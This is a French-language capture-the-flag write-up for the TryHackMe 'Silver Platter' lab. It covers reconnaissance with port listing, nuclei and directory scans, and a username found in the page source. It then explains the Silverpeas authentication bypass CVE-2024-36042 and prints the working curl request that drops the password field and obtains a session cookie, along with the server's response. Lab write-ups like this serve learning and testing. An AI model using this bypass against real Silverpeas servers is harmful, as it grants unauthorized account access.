========== SILVER PLATTER - TRY HACK ME CTF ==============

Adresse ip : http://10.80.160.37
Difficulté : easy

Instruction : Think you've got what it takes to outsmart the Hack Smarter Security team? They claim to be unbeatable, and now it's your chance to prove them wrong. Dive into their web server, find the hidden flags, and show the world your elite hacking skills. Good luck, and may the best hacker win!

But beware, this won't be a walk in the digital park. Hack Smarter Security has fortified the server against common attacks and their password policy requires passwords that have not been breached (they check it against the rockyou.txt wordlist - that's how 'cool' they are). The hacking gauntlet has been thrown, and it's time to elevate your game. Remember, only the most ingenious will rise to the top. 

May your code be swift, your exploits flawless, and victory yours!

Make sure you wait a full 5 minutes after you start the machine before scanning or doing any enumeration. This will make sure all the services have started. 

# RECONNAISSANCE 

### Liste des ports ouverts
```
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack
80/tcp   open  http       syn-ack
8080/tcp open  http-proxy syn-ack

```
### Enumération du web 

- Fichiers trouvé sur le readme.txt
Dimension by HTML5 UP
html5up.net | @ajlkn
Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)


This is Dimension, a fun little one-pager with modal-ized (is that a word?) "pages"
and a cool depth effect (click on a menu item to see what I mean). Simple, fully
responsive, and kitted out with all the usual pre-styled elements you'd expect.
Hope you dig it :)

Demo images* courtesy of Unsplash, a radtastic collection of CC0 (public domain) images
you can use for pretty much whatever.

(* = not included)

AJ
aj@lkn.io | @ajlkn


Credits:

	Demo Images:
		Unsplash (unsplash.com)

	Icons:
		Font Awesome (fontawesome.io)

	Other:
		jQuery (jquery.com)
		Responsive Tools (github.com/ajlkn/responsive-tools)



- Texte trouvé sur LICENSE.txt
Creative Commons Attribution 3.0 Unported
http://creativecommons.org/licenses/by/3.0/

### Decouverte 
Avec nuclei, on a pu découvrir des informations intéressantes 

```
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/silver_platter$ nuclei -u http://10.80.160.37 -tags discovery

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.11.1

		projectdiscovery.io

[INF] Current nuclei version: v3.11.1 (latest)
[INF] Current nuclei-templates version: v10.5.1 (latest)
[INF] New templates added in latest release: 68
[INF] Templates loaded for current scan: 3177
[INF] Executing 3177 signed templates from projectdiscovery/nuclei-templates
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1666 (Reduced 1601 Requests)
[waf-detect:nginxgeneric] [http] [info] http://10.80.160.37
[ssh-auth-methods] [javascript] [info] 10.80.160.37:22 ["["publickey","password"]"]
[ssh-server-enumeration] [javascript] [info] 10.80.160.37:22 ["SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4"]
[ssh-sha1-hmac-algo] [javascript] [info] 10.80.160.37:22
[ssh-password-auth] [javascript] [info] 10.80.160.37:22
[openssh-detect] [tcp] [info] 10.80.160.37:22 ["SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4"]
[nginx-eol:version] [http] [info] http://10.80.160.37 ["1.18.0"]
[nginx-version] [http] [info] http://10.80.160.37 ["nginx/1.18.0"]
[tech-detect:nginx] [http] [info] http://10.80.160.37
[INF] Scan completed in 33.521718245s. 9 matches found.
[INF] HTTP connections: 2285 total, 102 new, 2183 reused (95.5%)
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/silver_platter$

```
Maintenant, on a une surface d'attaque, mais d'abord, on a trouvé tout à l'heure un port 8080 http proxy, on va faire une petite reconnaissance sur ce port 

```
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/silver_platter$ telnet 10.80.160.37 8080
Trying 10.80.160.37...
Connected to 10.80.160.37.
Escape character is '^]'.
ls
HTTP/1.1 400 Bad Request
Content-Length: 0
Connection: close

Connection closed by foreign host.
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/silver_platter$ 

```
C'est confirmé, c'est un HTTP, mais je remarque qu'on est toujours redirigé vers http://10.80.160.37:8080/noredirect.html. On va donc sortir burpsuite pour voir ce qui se passe sous le capöt. 

```
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kryptonite/Bureau/hacking/labs/tryhackme/silver_platter/reports/http_10.80.160.37_8080/_26-10-31_23-54-06.txt

Target: http://10.80.160.37:8080/

[23:54:06] Starting: 
[23:55:37] 302 -    0B  - /console/  ->  /noredirect.html
[23:55:37] 302 -    0B  - /console/j_security_check  ->  /noredirect.html
[23:55:37] 302 -    0B  - /console  ->  /noredirect.html
[23:55:37] 302 -    0B  - /console/payments/config.json  ->  /noredirect.html
[23:55:37] 302 -    0B  - /console/login/LoginForm.jsp  ->  /noredirect.html
[23:55:37] 302 -    0B  - /console/base/config.json  ->  /noredirect.html
[23:57:41] 302 -    0B  - /website  ->  http://10.80.160.37:8080/website/

Task Completed
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/silver_platter$ 

```

On est toujours redirigé vers noredirect.html. Il nous manque quelque chose, et j'ai examiné le code source de la page principale et j'ai trouvé cela
```
If you'd like to get in touch with us, please reach out to our project manager on Silverpeas. His username is "scr1ptkiddy".
```

Directement, on a recherché une faille de silverpeas et on a trouvé un 

```
L'application Silverpeas présente une vulnérabilité critique de contournement d'authentification (CVE-2024-36042).
• Le vecteur d'attaque : Il s'agit d'un défaut de logique dans le traitement des requêtes de connexion.
• La méthode : En envoyant une requête POST vers /silverpeas/AuthenticationServlet contenant uniquement Login=scr1ptkiddy&DomainId=0 et en supprimant complètement le paramètre de mot de passe (via un outil comme Burp Suite ou une commande curl), l'application valide l'authentification et génère un cookie de session valide (JSESSIONID).
```
On a donc envoyé notre payload 

```
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/silver_platter$ curl "http://10.80.160.37:8080/silverpeas/AuthenticationServlet" \
  -d "Login=scr1ptkiddy&DomainId=0" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -v
*   Trying 10.80.160.37:8080...
* Connected to 10.80.160.37 (10.80.160.37) port 8080
> POST /silverpeas/AuthenticationServlet HTTP/1.1
> Host: 10.80.160.37:8080
> User-Agent: curl/8.5.0
> Accept: */*
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 28
> 
< HTTP/1.1 302 Found
< Set-Cookie: JSESSIONID=IRKSe1A12p78sp0TmA-CmfgUU2VEimvDz-_uY78Y.ebabc79c6d2a; path=/silverpeas; HttpOnly
< Set-Cookie: defaultDomain=0; path=/; Max-Age=31536000; Expires=Sun, 31-Oct-2027 21:18:19 GMT
< Set-Cookie: svpLogin=scr1ptkiddy; path=/; Max-Age=31536000; Expires=Sun, 31-Oct-2027 21:18:19 GMT
< X-XSS-Protection: 1
< x-ua-compatible: ie=edge
< X-Frame-Options: SAMEORIGIN
< Location: http://10.80.160.37:8080/silverpeas/Main//look/jsp/MainFrame.jsp
< Content-Security-Policy: default-src 'self' blob: mailto:  https: spwebdav:  ws://10.80.160.37:8080 ; script-src 'self' blob: 'unsafe-inline' 'unsafe-eval'  https: spwebdav: https://apis.google.com; style-src 'self' 'unsafe-inline'  https: spwebdav: https://fonts.googleapis.com; style-src-elem 'self' blob: 'unsafe-inline' https://fonts.googleapis.com
< Date: Sat, 31 Oct 2026 21:18:19 GMT
< Connection: keep-alive
< Access-Control-Allow-Origin: http://10.80.160.37:8080
< X-Content-Type-Options: nosniff
< Content-Length: 0
< 
* Connection #0 to host 10.80.160.37 left intact
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/silver_platter$ 

```
